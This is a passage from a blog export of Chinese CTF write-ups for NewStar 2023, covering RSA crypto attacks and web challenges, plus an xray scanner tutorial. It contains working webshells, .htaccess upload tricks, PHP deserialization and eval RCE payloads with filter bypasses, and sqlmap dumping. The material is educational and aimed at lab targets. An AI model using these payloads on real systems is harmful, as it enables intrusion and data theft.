20442989381348880630046435751193745753\ne = 2\n\ninv_p = gmpy2.invert(p, q)\ninv_q = gmpy2.invert(q, p)\nmp = pow(c, (p + 1) // 4, p)\nmq = pow(c, (q + 1) // 4, q)\na = (inv_p * p * mq + inv_q * q * mp) % n\nb = n - int(a)\nc = (inv_p * p * mq - inv_q * q * mp) % n\nd = n - int(c)\n# 因为rabin 加密有四种结果，全部列出。\naa = [a, b, c, d]\nfor i in aa:\n    print(i)\n    print(libnum.n2s(int(i)))\n```\n\n#### 小明的密码题\n\n题目：\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import *\nflag_part = flag_content + '#' + secret_token\np = getPrime(512)\nq = getPrime(512)\n\nm = bytes_to_long(flag_part.encode())\n\ne = 5\nn = p*q\n\nc = pow(m,e,n)\n\nprint('n =', n)\nprint('c =', c)\nprint('flag_part =', flag_part)\nprint()\nprint('--- hint begin ---')\nprint('flag = \"flag{\" + flag_part + \"}\"')\nprint('type of secret_token is', type(secret_token))\nprint('length of secret_token is', len(secret_token))\n\n# n = 131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899\n# c = 11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379\n# flag_part = sm4ll_r00ts_is_brilliant#◼️◼️◼️◼️◼️◼️◼️◼️\n# \n# --- hint begin ---\n# flag = \"flag{\" + flag_part + \"}\"\n# type of secret_token is <class 'str'>\n# length of secret_token is 8\n\n```\n\n根据题目提示，可以看出是**rsa的m高位泄露攻击：**\n\n将first_part 字节转换成十进制\n\n```python\nfrom Crypto.Util.number import *\nhigh_m=b'sm4ll_r00ts_is_brilliant#00000000'\nprint(bytes_to_long(high_m))\n# high_m = 13365484987144638321487231038779529936591301518920854766433948366068803286609968\n```\n\n利用`sagemath`https://sagecell.sagemath.org/\n\n编写sage一把梭\n\n```python\nn = 131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899\nc = 11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379\nhigh_m= 13365484987144638321487231038779529936591301518920854766433944893740507058929664\n\nR.<x> = PolynomialRing(Zmod(n), implementation='NTL')\nm = high_m + x\nM = m((m^5 - c).small_roots()[0])\nprint(M)\n\n# M = 13365484987144638321487231038779529936591301518920854766433952055361547196905266\n```\n\n解密M：将十进制转换成字节\n\n```python\nfrom Crypto.Util.number import *\n\nM = 13365484987144638321487231038779529936591301518920854766433952055361547196905266\nprint(long_to_bytes(M).decode('utf-8', errors='ignore'))\n# sm4ll_r00ts_is_brilliant#cc0dac72\n```\n\n#### easy_crt\n\n题目：\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import flag, p, q\nfrom hashlib import *\nimport random\n\nassert 'flag{' + md5(str(p).encode()).hexdigest() + '}' == flag\nassert isPrime(p), isPrime(q)\nassert p.bit_length() == 1024, q.bit_length() == 1024\n\nm = random.getrandbits(400)\ne = 65537\nd = inverse(e, (p - 1) * (q - 1))\nr1, r2, r3 = getPrime(20), getPrime(20), getPrime(10)\n\ndp, dq = d % (p - 1), d % (q - 1)\nSp, Sq = pow(m + getPrime(10), dp, r1 * p), pow(m, dq, r2 * q)\ns1, s2 = pow(m, dp % (r1 - 1), r1), pow(m, dq % (r2 - 1), r2)\nS_ = Sq + (q * r2) * (int(inverse(q * r2, p * r1)) * (Sp - Sq) % (p * r1))\nc1, c2 = (S_ - s1 + 1) % r1, (S_ - s2 + 1) % r2\ngamma = (r3 * c1 + (2 ** 10 - r3) * c2) // (2 ** 10)\nS = pow(S_, gamma, p * q)\n\nprint(m)\nprint(p * q)\nprint(S_)\nprint(S)\n\n'''\nm=2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987\nn=25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467\nS_=5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366\nS=11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321\n'''\n\n```\n\n参考文献：https://www.infocomm-journal.com/cjnis/article/2019/2096-109x/2096-109x-5-1-00030.shtml\n\n![image-20231027170037956](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027170037956.png)\n\n编写exp:\n\n```python\nfrom Crypto.Util.number import *\nfrom hashlib import *\n\nm = 2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987\nn = 25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467\nS_ = 5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366\nS = 11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321\n\ne = 65537\np = GCD(pow(S_, e, n) - pow(m, 1, n), n)\nq = n // p\n\nprint('flag{' + md5(str(p).encode()).hexdigest() + '}')\nprint('flag{' + md5(str(q).encode()).hexdigest() + '}')\n\n```\n\n\n\n> 官方WriteUp：https://shimo.im/docs/QPMRxzGktzsZnzhz\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"xray-webscan使用教程","url":"/xray-webscan使用教程/","content":"\n# xray-webscan\n\n## 快速使用\n\n### 扫描一个站点\n\n最简单的方式是直接调用，扫描一个指定的站点，如：\n\n```text\n./xray webscan --basic-crawler http://example.com/\n```\n\n> 这可能是最简单最常用的一个功能，就是太长了，体验不太友好，建议常用的同学可以 `alias xray=\"/path/xray webscan --basic-crawler\"`\n\n### 指定扫描输出\n\n不指定输出时，默认输出到控制台的标准输出中，可以做管道处理，也可以选择输出为文件，如：\n\n```text\n./xray webscan --url http://example.com/ --json-output report.json\n```\n\n不同参数对应不同的输出方式：\n\n- 无参数：输出到控制台的标准输出\n- `--text-output`：输出到文本文件中\n- `--json-output`：输出到 JSON 文件中\n- `--html-output`：输出到 HTML 文件中\n\n### 基于代理的被动扫描\n\nxray 可以通过类似 Burp 的方式启动，利用 HTTP 代理来抓包扫描，如：\n\n```text\n./xray webscan --listen 127.0.0.1:7777\n```\n\n如果运行没报任何错就可以设置浏览器 HTTP 代理为 `127.0.0.1:7777` 了，关于如何设置浏览器代理，请打开百度搜索 “浏览器设置代理”。\n\n代理设置 OK 以后就可以启动代理扫描了，这时候我们打来浏览器尽情冲浪吧，理论上我们的鼠标点到哪 xray 就能扫到哪。\n\n需要注意一下的是，很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的 `ca.crt` 证书，关于如何导入 CA 证书，请打开百度搜索 “安装CA证书”。\n\n```text\n➜   ls\nca.crt      ca.key      config.yaml xray\n```\n\n## 高级姿势\n\n### 指定扫描插件\n\n使用 `--plugins` 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：\n\n```text\n./xray webscan --plugins cmd_injection --url http://example.com/\n```\n\n目前提供的插件列表如下：\n\n- SQL 注入检测 (key: sqldet)\n  支持报错注入、布尔注入和时间盲注等\n- XSS 检测（key: xss）\n  支持扫描反射型、存储型 XSS\n- 命令/代码注入检测 (key: cmd_injection)\n  支持 shell 命令注入、PHP 代码执行、模板注入等\n- 目录枚举 (key: dirscan)\n  检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件\n- 路径穿越检测 (key: path_traversal)\n  支持常见平台和编码\n- XML 实体注入检测 (key: xxe)\n  支持有回显和反连平台检测\n- POC 管理 (key: phantasm)\n  默认内置部分常用的 POC，用户可以根据需要自行构建 POC 并运行。可参考：[POC 编写文档](https://link.zhihu.com/?target=https%3A//chaitin.github.io/xray/%23/guide/poc)\n- 文件上传检测 (key: upload)\n  支持检测常见的后端服务器语言的上传漏洞\n- 弱口令检测 (key: brute_force)\n  支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典\n- JSONP 检测 (key: jsonp)\n  检测包含敏感信息可以被跨域读取的 jsonp 接口\n- SSRF 检测 (key: ssrf)\n  ssrf 检测模块，支持常见的绕过技术和反连平台检测\n- 基线检查 (key: baseline)\n  检测低 SSL 版本、缺失的或错误添加的 http 头等\n- 任意跳转检测 (key: redirect)\n  支持 HTML meta 跳转、30x 跳转等\n- CRLF 注入 (key: crlf_injection)\n  检测 HTTP 头注入，支持 query、body 等位置的参数\n- …\n\n### 只扫描一个 URL\n\nxray 还提供了方便的只扫描一个 URL 的方式，如：\n\n```text\n./xray webscan --url http://example.com/ --json-output out.json\n```\n","tags":["工具","xray"],"categories":["利其器"]},{"title":"NewStar 2023 Week2","url":"/NewStar-WriteUp-Week2/","content":"\n# NewStar 2023 Week2 \n\n## WEB\n\n### 游戏高手\n\n![image-20231009095418077](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png)\n\n1. 打开题目看到上述，显然不可能玩到100000分，首先bp抓包看看有什么发现\n\n![image-20231009095513886](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095513886.png)\n\n2. 似乎没有什么有用信息，查看源代码，好像有有用信息`app_v2.js` js文件\n\n![image-20231009095623116](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095623116.png)\n\n3. 查看js文件于是有了想法：是否可以直接修改原始的分数\n\n![image-20231009095742045](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095742045.png)\n\n4. 调试器，在20行设置断点，F5刷新后，在控制台输入：`gameScore = 100000`\n\n![image-20231009095940757](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095940757.png)\n\n5. 接着返回调试器，可以看到此时的`gameScore`的值为100000\n\n![image-20231009100051189](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100051189.png)\n\n\n\n6. 接着F8,让js代码顺利执行，进入游戏会发现原始分变成了100000，结束游戏即可得到flag\n\n![image-20231009100224984](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100224984.png)\n\n### include 0。0\n\n1. 打开就看到源码\n\n```php\n <?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?> \n```\n\n2. 发现过滤了`base`和`rot` ，但是还有其他一些过滤器可以用\n3. 构造**payload：**`php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php`\n\n![image-20231017142837510](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017142837510.png)\n\n4. 成功拿到flag`flag{670e28dc-940b-4d66-92ec-40be4a0ae771}`\n\n### ez_sql\n\n1. 看到题目，肯定是sql注入相关的，直接sqlmap扫描\n\n   `sqlmap -u \"http://a53134e7-8ebc-46e4-bc62-ac46e2b91837.node4.buuoj.cn:81/?id=TMP11503\" --dbs  `\n\n![image-20231010093655169](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093655169.png)\n\n2. 直接使用 `--dump`,列出所有的表数据\n\n   ![image-20231010093800968](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093800968.png)\n\n​\t`flag{ae2227f2-2ea1-4cd8-84b7-ad1d21cda25d}`\n\n### Unserialize?\n\n1. 打开看到源码\n\n```php\n <?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?> \n```\n\n2. 发现只需要设置evil类中cmd成员的值然后反序列化触发`__destruct`析构函数即可触发RCE\n\n3. 发现过滤了`cat|tac|more|tail|base`，但是可以用`ls` 查看目录，构造payload\n\n```php\n<?php\nclass evil{\n    public $cmd = 'ls';\n}\n$e = new evil();\necho urlencode(serialize($e));\n?>\n    \n    \n# 运行结果\n  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22ls%22%3B%7D\n```\n\n![image-20231017143949315](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017143949315.png)\n\n4. 发现当前目录只有`index.php`,于是查看根目录\n\n```php\n<?php\nclass evil{\n    public $cmd = 'ls /';\n}\n$e = new evil();\necho urlencode(serialize($e));\n?>\n\n    \n# 运行结果\n  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n```\n\n5. 需要注意的是运行结果中有 + 需要将+改成%20，得到根目录\n\n   ![image-20231017144311370](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144311370.png)\n\n6. 找到可疑目录`th1s_1s_fffflllll4444aaaggggg`,但是cat被过滤，想办法绕过\n\n```php\n<?php\nclass evil{\n    public $cmd = 'ca``t th1s_1s_fffflllll4444aaaggggg';\n}\n$e = new evil();\necho urlencode(serialize($e));\n?>\n\n    \n# 运行结果\n O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A36%3A%22ca%60%60t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D\n```\n\n![image-20231017144727107](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144727107.png)\n\n### Upload again!\n\n![image-20231010094041762](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094041762.png)\n\n1. 首先利用bp抓包试试，正常上传图片正常回显\n\n   ![image-20231010094343511](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094343511.png)\n\n2. 将图片后缀更改为php，显示错误\n\n   ![image-20231010094430575](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094430575.png)\n\n3. 试着上传图片马，还是能检测出来\n\n   ![image-20231010094608740](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094608740.png)\n\n4. 猜测可能是检测了后缀，以及检测图片内容中是否包含了php代码，试着去掉php代码\n\n   ![image-20231010094944563](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094944563.png)\n\n5. 仍然被检测出来，现在猜测可能是由于`<? ?>`，去掉`<? ?>`,保留php中的代码，发现能成功上传\n\n   ![image-20231010095437194](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010095437194.png)\n\n6. **利用script代替<? 、?>标签**\n\n   ```javascript\n   <script language=\"php\">@eval($_POST['111111']);</script>\n   ```\n\n\n7. 但是，图片中的php代码不能被解析，尝试先上传`.htaccess`文件，在上传对应图片，这样图片中的php代码就能被解析\n\n   ```htaccess\n   <FilesMatch \"evil.png\">\n   \n   SetHandler application/x-httpd-php\n   \n   </FilesMatch>\n   ```\n\n![image-20231010100336815](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100336815.png)\n\n8. 接着上传 `evil.png`文件\n\n   ![image-20231010100505136](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100505136.png)\n\n9. 接着用蚁剑连接，查询可疑文件\n\n   ![image-20231010101448421](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010101448421.png)\n\n   \n\n`flag{4366f19d-3ec5-4dec-801f-113d944e370a}`\n\n\n\n### R!!C!!E!!\n\n根据提示有信息泄露，可以使用dirsearch扫，扫出了 /.git\n\n使用githack工具获取源码\n\n![image-20231025154033987](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025154033987.png)\n\nbo0g1pop.php源码：\n\n```php\n<?php\nhighlight_file(__FILE__);\nif (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) {\n    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){\n        eval($_GET['star']);\n    }\n}\n```\n\n根据提示绕过两处正则：\n\n- 第一个正则对提交的参数进行处理：任意字符加上可选的括号（允许嵌套）更换为空，然后判断是否等于分号，结合下面的 eval 可以知道就是无参数命令执行。\n- 第二个正则过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，可以使用类似功能的方法进行绕过，最终命令执行。\n\n官方payload（使用 bp 发送的请求）：\n\n```bash\nGET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1\nHost: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflateConnection: close\nX-Forwarder-Proto: system('cat /f*');\nUpgrade-Insecure-Requests: 1\n```\n\n有一篇writeup写的很好：https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html\n\n## Crypto\n\n### 滴啤\n\n1. 根据提示 应该考察的是RSA `dp泄露`\n\n   ![image-20231010151245060](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151245060.png)\n\n2. 看到注释的三条数据，大概率就是dp泄露，编写dp泄露脚本\n\n```python \nimport gmpy2\nimport libnum\nn= 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931\ne= 65537\nc= 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089\ndp= 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635\n\np=gmpy2.gcd(pow(2,e*dp,n)-2,n)\nprint(p)\n\nfor i in range(1, e):\n    p = (dp * e - 1) // i + 1\n    if n % p == 0:\n        q = n // p\n        print(q)\n        break\nprint(q)\nphi_n = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi_n)\nm = pow(c, d, n)\nprint(m)\nflag = libnum.n2s(int(m))\nprint(flag)\n```\n\n![image-20231010151350788](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151350788.png)\n\n`flag{cd5ff82d-989c-4fbf-9543-3f98ab567546}`\n\n\n\n### 不止一个pi\n\n1. 同样根据题目和给出的python代码，猜测仍然是RSA中的 `e和phi不互素`，即是 存在两个或多个模数**且`gcd(N1,N2)!=1`** \n\n![image-20231010152809765](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152809765.png)\n\n```python\nimport gmpy2\nimport libnum\n\np = 171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217\nq = 115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713\ne = 65537\nc = 4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337\n\nn = p * q\nphi = (p - 1) * (q - 1)\n\nt = gmpy2.gcd(e, phi)\nt1 = e // t\ndt1 = gmpy2.invert(t1, phi)\nmt1 = pow(c, dt1, n)\nprint(mt1)\ns, m = gmpy2.iroot(mt1, t)\nprint(s)\nprint(libnum.n2s(int(s)))\n```\n\n![image-20231010152850074](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152850074.png)\n\n`flag{bu_zhi_yige_p1dsaf}`\n\n### halfcandecode\n\nout.txt：\n\n```bash\n113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969\n43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649\n4a8a08f09d37b73795649038408b5f33\n03c7c0ace395d80182db07ae2c30f034\ne1671797c52e15f763380b45e841ec32\nb14a7b8059d9c055954c92674ce60032\ne358efa489f58062f10dd7316b65649e\ncfcd208495d565ef66e7dff9f98764da\nb14a7b8059d9c055954c92674ce60032\n8fa14cdd754f91cc6554c9e71929cce7\n0cc175b9c0f1b6a831c399e269772661\n4a8a08f09d37b73795649038408b5f33\ne358efa489f58062f10dd7316b65649e\ncfcd208495d565ef66e7dff9f98764da\n4b43b0aee35624cd95b910189b3dc231\ncbb184dd8e05c9709e5dcaedaa0495cf\n\n```\n\ntask.py\n\n```python\nfrom Crypto.Util.number import *\nimport gmpy2\nfrom flag import flag\nimport os\nfrom hashlib import md5\n\ndef gen_prime(number):\n    p = getPrime(number // 2)\n    q = gmpy2.next_prime(p)\n    return p * q\n\ndef md5_hash(m):\n    return md5(m.encode()).hexdigest()\ne = 65537\nn = gen_prime(1024)\nm1 = bytes_to_long(flag[:len(flag) // 2].encode() + os.urandom(8))\nc1 = pow(m1, e, n)\nm2 = flag[len(flag) // 2:]\nwith open(\"out.txt\",\"w\") as f:\n    f.write(str(n) + '\\n')\n    f.write(str(c1) + '\\n')\n    for t in m2:\n        f.write(str(md5_hash(t))+'\\n')\n\n\n```\n\n首先判断是RSA 的加密，根据提示，猜测可能flag由两端构成\n\n首先大素数分解,RSA解密：\n\n```python\nimport gmpy2\nfrom Crypto.Util.number import *\n\n# 公钥e\ne = 65537\n\n# 欧拉函数eular euler = (p - 1) * (q - 1)\np = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993409\nq = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993841\n\neular = (p - 1) * (q - 1)\nn = 113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969\nc = 43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649\n# 私钥d\nd = gmpy2.invert(e, eular)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m).decode('utf-8', errors='ignore'))\n# print(long_to_bytes(m).decode('latin-1', errors='ignore'))\n# print(long_to_bytes(m).decode('gbk', errors='ignore'))\n```\n\n得到前半段flag：`flag{two_cloab`\n\n接着md5解密，后半段：`cse_t0_fact0r}`\n\n### partial decrypt\n\n题目：\n\n```python\nfrom secret import flag\nfrom Crypto.Util.number import *\n\nm = bytes_to_long(flag)\ne = 65537\np = getPrime(512)\nq = getPrime(512)\n\nn = p*q \n\nc = pow(m,e,n)\n\ndp = inverse(e, (p-1))\ndq = inverse(e, (q-1))\nm1 = pow(c,dp, p)\nm2 = pow(c,dq, q)\nq_inv = inverse(q, p)\nh = (q_inv*(m1-m2)) % p\nprint('m2 =', m2)\nprint('h =', h)\nprint('q =', q)\n\n# m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884\n# h = 4180720137090447835816240697100630525624574275\n# q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931\n```\n\n这是关于RSA-CRT(中国剩余定理)\n\n```python\nfrom Crypto.Util.number import *\n\nm2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884\nh = 4180720137090447835816240697100630525624574275\nq = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931\n\nm = m2+h*q\nprint(long_to_bytes(m))\n```\n\n![image-20231025151826920](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025151826920.png)\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"NewStar 2023 Week1","url":"/NewStar-2023/","content":"\n# NewStar WriteUp Week1\n\n## web\n\n### 泄露的秘密\n\n![image-20230925142322020](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142322020.png)\n\n看到题目 首先想到 信息泄露相关的知识点：想到 phpinfo.php test.php .... \n\n​\t\t\t最后到`robots.txt` 得到一半flag：\n\n![image-20230925142512313](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142512313.png)\n\n`PART ONE: flag{r0bots_1s_s0_us3ful`\n\n`www.zip:` \n\n![image-20230925154247859](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925154247859.png)\n\n`$PART_TWO = \"_4nd_www.zip_1s_s0_d4ng3rous}\";`\n\n```php\n<?php\n$PART_TWO = \"_4nd_www.zip_1s_s0_d4ng3rous}\";\necho \"<h1>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！</h1>\";\n```\n\n### Begin of Upload\n\n![image-20230925152823289](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152823289.png)\n\n典型的文件上传漏洞 简单的尝试一下：\n\n利用bp抓包 修改后缀以及添加一句话php后门代码：` <?php @eval($_POST['111111']);?>`\n\n![image-20230925152958967](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152958967.png)\n\n上传成功 利用蚁剑连接\n\n![image-20230925153150350](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925153150350.png)\n\n发现flag`flag{ba65aadc-84ca-4ece-9a14-fadf4362f3c3}`\n\n### ErrorFlask\n\n打开靶机显示：\n\n![image-20230925214243591](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214243591.png)\n\n先利用抓包 